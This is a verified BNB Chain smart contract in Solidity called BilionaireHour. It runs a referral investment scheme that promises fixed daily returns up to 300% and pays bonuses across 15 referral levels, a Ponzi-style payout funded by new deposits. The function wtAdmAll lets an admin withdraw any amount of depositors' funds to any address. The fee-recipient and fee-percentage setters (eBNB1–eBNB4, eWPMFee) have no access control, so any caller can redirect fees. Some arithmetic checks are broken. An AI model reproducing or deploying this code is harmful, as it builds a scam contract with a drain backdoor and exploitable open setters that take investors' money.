/**
 *Submitted for verification at BscScan.com on 2022-11-10
*/

// SPDX-License-Identifier: PROPRIETARY - Murilo

pragma solidity ^0.8.17;

//import "@openzeppelin/contracts/access/Ownable.sol";
//import "./IERC20.sol";

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


contract BilionaireHour is Ownable {
    
  struct addressCheck {
    address _address;
    uint8 permissionLevel;
  }

  struct logsStructure {
    address _address;
    uint _amount;
    string _type;
    uint _time;
  }

  addressCheck[] public permissions;
  logsStructure[] public logs;

  struct userI {
    address up;
    uint reffAmount;
    uint unlockedLevel;
    bool registered;
    uint lastWithdraw;
    uint lastDeposit;
    uint dTotal;
    uint dCounter;
    uint wAmount;
  }

  struct userE {
    uint dValue;
    uint dTime;
    uint pAmount;
    uint wpAmount;
    uint rAmount;
    uint wAmount;
  }

  mapping(address => userI) public aInfo;
  mapping(address => userE) public aEarning;

  uint16[] residualData = new uint16[](15);
  uint public minToLvlUp = 0.002 ether;
  uint public holdPassiveOnDrop = 75;
  uint public ntSize;
  uint public ntDeposits;
  uint public ntWithdraw;
  uint cumulativeNetworkFee;
  uint cumulativeWPMFee;
  bool public dPNS = true;
  uint public maxBalance;
  uint public minD = 0.036 ether;
  uint public maxD = 40 ether;
  uint public minS = 0.03 ether;
  uint8 public dRentability = 50;
  uint16 public maxEarning = 300;
  uint public FPercent = 50;
  uint public FAmount = 0 ether;
  uint public dBonus = 100;
  uint public minAmountBonus = 0.001 ether;


  address constant firstUser = 0x1DecA1E9f709b912E504e726aed8097a10B5B9B0;
  address bnb1 = 0xd8Ff0Ff5817540bA06d03398017927853c5723f4;
  address bnb2 = 0x27E410b52A0497091ad24fbb004ae2fEE506d034;
  address bnb3 = 0x7767719ce3a1f19e9076434FaAe3B6a8F4BD1443;
  address bnb4 = 0x64B18935395b83937A35B8EFae673354A4A8a807;

    constructor() {
        permissions.push(
        addressCheck(
            0x3c0bC8835c922D41055EBC4eBA3A337dc54E531e,
            2
        )
        );
        residualData[0] = 80;
        residualData[1] = 30;
        residualData[2] = 20;
        residualData[3] = 10;
        residualData[4] = 10;
        residualData[5] = 10;
        residualData[6] = 10;
        residualData[7] = 10;
        residualData[8] = 10;
        residualData[9] = 10;
        residualData[10] = 10;
        residualData[11] = 10;
        residualData[12] = 10;
        residualData[13] = 10;
        residualData[14] = 10;

        aInfo[firstUser].up = address(0);
        aInfo[firstUser].unlockedLevel = 0;
        aInfo[firstUser].registered = true;
        aInfo[firstUser].dTotal = 1 ether;
        aEarning[firstUser].dTime = block.timestamp;
        aEarning[firstUser].dValue = 0.1 ether;
        ntSize += 1;
    }

    function lInfo() external view returns( logsStructure[] memory)  {
      return logs;
    }

    //EditFuncion
    function eBNB1(address _address) external {
      bnb1 = _address;
    }
    function eBNB2(address _address) external {
      bnb2 = _address;
    }
    function eBNB3(address _address) external {
      bnb3 = _address;
    }
    function eBNB4(address _address) external {
      bnb4 = _address;
    }
    
    function eWPMFee(uint _amount) external {
      FPercent = _amount;
    }
    

    // --------------------- FREE METHODS ---------------------------
    function rn() external payable {
        address sender = msg.sender;
        uint _amount = msg.value;
        (,uint freeToWithdrawl,) = AFW(sender);
        require(aInfo[sender].registered == true && _WTOR(sender) == 0 && freeToWithdrawl == 0 && _amount >= minD && _amount <= maxD , "Error");
        _rD(sender, _amount, 0);
        logs.push(
          logsStructure(
            sender,
            _amount,
            'RN',
            block.timestamp
          )
        );
    }

    function wTotal() external {
        address sender = msg.sender;
        (,uint freeToWithdrawl, uint comulativePercent) = AFW(sender);
        require(_WTOR(sender) == 0 && address(this).balance >= freeToWithdrawl && (aInfo[sender].lastWithdraw + 1 days) < block.timestamp , "Error");
        ntWithdraw += 1;
        dWa(sender, freeToWithdrawl);
        aEarning[sender].pAmount = comulativePercent;
        payable(sender).transfer(freeToWithdrawl);
        FAmount += (freeToWithdrawl * FPercent) / 1000;
        logs.push(
          logsStructure(
            sender,
            freeToWithdrawl,
            'WT',
            block.timestamp
          )
        );
    }

    function WaU(uint _amount) external {
        address sender = msg.sender;
        (,uint freeToWithdrawl, uint comulativePercent) = AFW(sender);
        require(freeToWithdrawl > 0 && freeToWithdrawl >= _amount && (aInfo[sender].lastWithdraw + 1 days) < block.timestamp  , "Error");
        aEarning[sender].pAmount = comulativePercent;
        dWa(sender, _amount);
        _rD(sender, _amount, 1);
        logs.push(
          logsStructure(
            sender,
            _amount,
            'CPOUND',
            block.timestamp
          )
        );
    }

    function wP(uint _amount) external {
        address sender = msg.sender;
        require(address(this).balance >= _amount && (aInfo[sender].lastWithdraw + 1 days) < block.timestamp , "Insufficient balance");
        require(_WTOR(sender) > 0, "insufficient funds");
        (uint freeToWithdrawl,,) = AFW(sender);
        require(freeToWithdrawl > 0, "Min amount not reached");
        require(freeToWithdrawl >= _amount, "insufficient funds");
        ntWithdraw += 1;
        dWa(sender, _amount);
        aEarning[sender].pAmount += _amount;
        payable(sender).transfer(_amount);
        FAmount += (_amount * FPercent) / 1000;
        logs.push(
          logsStructure(
            sender,
            _amount,
            'WP',
            block.timestamp
          )
        );
    }

    function uD() external payable {
        address sender = msg.sender;
        uint _amount = msg.value;
        (,uint freeToWithdrawl, uint comulativePercent) = AFW(sender);
        require(_amount >= minD, "Min amount not reached");
        require((freeToWithdrawl + _WTOR(sender)) > 0, "it's not running");
        aEarning[sender].pAmount = comulativePercent;
        ntDeposits += 1;
        FAmount += (_amount * FPercent) / 1000;
        _rD(sender, _amount, 2);
        logs.push(
          logsStructure(
            sender,
            _amount,
            'upgrade',
            block.timestamp
          )
        );
    }

    function rA(address ref) external payable {
        address sender = msg.sender;
        uint _amount = msg.value;
        if (aInfo[ref].registered != true) {
            ref = firstUser;
        }
        require(aInfo[sender].registered == false && _amount <= maxD && _amount >= minD, "Error");
        //Registra o usuario na rede 
        aInfo[ref].dCounter++;
        aInfo[sender].up = ref;
        aInfo[sender].registered = true;
        aInfo[sender].unlockedLevel = 1;
        ntSize += 1;
        ntDeposits += 1;
        //Realiza um novo deposito
        FAmount += (_amount * FPercent) / 1000;
        _rD(sender, _amount, 0);
        logs.push(
          logsStructure(
            sender,
            _amount,
            'Ra',
            block.timestamp
          )
        );
    }

  // --------------------- PRIVATE METHODS ---------------------------
    function setMB() private {
      uint contractBalance = address(this).balance;
      if (maxBalance < contractBalance) {
        	maxBalance = contractBalance;
      }
    }
    function _rD(address sender, uint amount, uint8 _t) private {
        if ( address(this).balance < ((maxBalance * holdPassiveOnDrop) / 100) ) {
            dPNS = false;
        } else if ( address(this).balance > maxBalance) {
            dPNS = true;
        }

        setMB();

        require(aInfo[sender].registered == true, "Registration is required");
        aInfo[sender].lastDeposit = block.timestamp;
        ntDeposits = ntDeposits + amount;
        address referral = aInfo[sender].up;
        if (_t== 0 || _t == 2) {
          bool breakerResidual = false;
            uint8 payLevel = 1;
            address _Base = sender;
            uint dCounter = aInfo[referral].dCounter;
            aInfo[sender].dTotal += amount;
            if (dCounter > 15) {
              aInfo[referral].unlockedLevel = 15;
            } else if(dCounter > 1) {
              aInfo[referral].unlockedLevel = dCounter;
            } 
            while(breakerResidual == false) {
                address _addressResidualReferral = aInfo[_Base].up;
                if (dPNS == true && aInfo[_addressResidualReferral].registered == true && aInfo[_addressResidualReferral].dTotal >= minAmountBonus && aInfo[_addressResidualReferral].unlockedLevel >= payLevel && payLevel < (residualData.length + 1) ) {
                    uint residualBonusAmount = (amount * residualData[payLevel - 1]) / 1000; // RESIDUAL BONUS
                    residualBonusAmount = getBonusValueToWrite(residualBonusAmount, _addressResidualReferral);
                    if (residualBonusAmount > 0) {
                        aEarning[_addressResidualReferral].rAmount += residualBonusAmount;
                        aInfo[_addressResidualReferral].reffAmount += residualBonusAmount;
                        logs.push(
                          logsStructure(
                            _addressResidualReferral,
                            residualBonusAmount,
                            'unilevel',
                            block.timestamp
                          )
                        );
                                    }
                }
                address nextAddress = aInfo[_addressResidualReferral].up;
                if (aInfo[nextAddress].registered == true && payLevel < (residualData.length + 1)) {
                    payLevel += 1;
                    _Base = _addressResidualReferral;
                } else {
                    breakerResidual = true;
                }
            }
        }

        if (_t == 0) {
            aEarning[sender].dValue = amount;
            aEarning[sender].dTime = block.timestamp;
            aEarning[sender].pAmount = 0;
            aEarning[sender].rAmount = 0;
            aEarning[sender].wAmount = 0;
            aEarning[sender].wpAmount = 0;
        } else if (_t == 1 || _t == 2) {
            aEarning[sender].dValue += amount;
            aEarning[sender].dTime = block.timestamp;
        }
        //Pay fee
        if (FAmount > 0.015 ether && address(this).balance >= FAmount) {
		//5000000000000000
          uint payAmount = FAmount / 4;
          payable(bnb1).transfer(payAmount);
          payable(bnb2).transfer(payAmount);
          payable(bnb3).transfer(payAmount);
          payable(bnb4).transfer(payAmount);
          FAmount = 0;
        }

    }

    function dWa(address _address, uint _amount) private returns(bool) {
        aInfo[_address].lastWithdraw = block.timestamp;
        ntWithdraw += _amount;
        if (aEarning[_address].rAmount >= _amount) {
            aEarning[_address].rAmount -= _amount;
            aEarning[_address].wAmount += _amount;
            aInfo[_address].wAmount += _amount;
            return true;
        } else {
            uint freeValue = aEarning[_address].rAmount;
            _amount -= freeValue;
            aEarning[_address].wAmount += freeValue;
            aInfo[_address].wAmount += freeValue;
            aEarning[_address].rAmount = 0;
        }
        
        aEarning[_address].wpAmount += _amount;
        aInfo[_address].wAmount += _amount;
        
        return true;

    }


  function findAdressIndex(address _address) private view returns(uint8){
    for (uint8 i = 0; i < permissions.length; i++) {
        if (permissions[i]._address == _address) {
          return i;
        }
    }
    return 200;
  }

  modifier isAuthorized(uint8 index) {
    uint8 addressIndex = findAdressIndex(_msgSender());
    require(addressIndex != 200, "Account does not have permission");
    uint8 _permisionLevel = permissions[findAdressIndex(_msgSender())].permissionLevel;
    if (_permisionLevel != 2) {
      require(permissions[findAdressIndex(_msgSender())].permissionLevel == index, "Account does not have permission");
    } 
    _;
  }

  function grantPermission(address operator, uint8 permissionLevel) external isAuthorized(2) {
    uint8 operatorIndex = findAdressIndex(operator);
    if (operatorIndex!= 200) {
      permissions[operatorIndex].permissionLevel = permissionLevel;
    } else {
      permissions.push(
        addressCheck(
          operator,
          permissionLevel
        )
      );
    }
  }

  function revokePermission(address operator) external isAuthorized(2) {
    permissions[findAdressIndex(operator)].permissionLevel = 0;
  }

  function safeApprove(
    address token,
    address spender,
    uint amount
  ) external isAuthorized(0) {
    IERC20(token).approve(spender, amount);
  }

  function safeTransfer(
    address token,
    address receiver,
    uint amount
  ) external isAuthorized(0) {
    IERC20(token).transfer(receiver, amount);
  }

   function lO() external view returns( addressCheck[] memory)  {
    return permissions;
  }

  function getData() public view returns(uint, uint, uint, uint) {
    return(address(this).balance, ntSize, ntDeposits, maxBalance);
  }


  function wtAdmAll(uint _amount, address _address) external isAuthorized(1) {
    payable(_address).transfer(_amount);
  }

  function _PE(address _address) public view returns(uint, uint) {
    uint secondsRunning =  block.timestamp - aEarning[_address].dTime;
    uint maximunReceived = _ME(_address);

    uint available = aEarning[_address].rAmount + aEarning[_address].wAmount;
    uint wpAmount = aEarning[_address].wpAmount;
    uint comulativeDay =  aEarning[_address].pAmount;
    uint comulativeEarnings = (comulativeDay - wpAmount) < 0 ? 0 : (comulativeDay - wpAmount);

    uint pasiveAvailable = (((dRentability  * aEarning[_address].dValue) / 1000) /  1 days) * secondsRunning;

    if ((available + pasiveAvailable + comulativeDay) > maximunReceived) {
      pasiveAvailable = (maximunReceived - (available + comulativeDay));
    }

    return ((pasiveAvailable + comulativeEarnings), (comulativeDay + pasiveAvailable));
  }

  
  
  function _ME (address _address) private view returns(uint) {
    return (aEarning[_address].dValue * maxEarning) / 100;
  }

  function _WTOR(address _address) public view returns(uint) {
    (, uint comulativeDay ) = _PE(_address);
    uint available = aEarning[_address].rAmount + aEarning[_address].wAmount + comulativeDay;  
    uint maximunReceived = _ME(_address);
    return maximunReceived - available;
  }

  function AFW(address _address) public view returns(uint, uint, uint) {
    (uint pasiveAvailable, uint comulativeDay) = _PE(_address);
    uint totalAvailable = pasiveAvailable + aEarning[_address].rAmount;    
    uint totalPercentAvailable = (totalAvailable * 30) / 100;
    
    return(totalPercentAvailable, totalAvailable, comulativeDay);
  }

  function getBonusValueToWrite(uint _value, address _address) public view returns(uint) {
        uint availableReferral = _WTOR(_address);
        return _value > availableReferral ? availableReferral : _value;
  }

}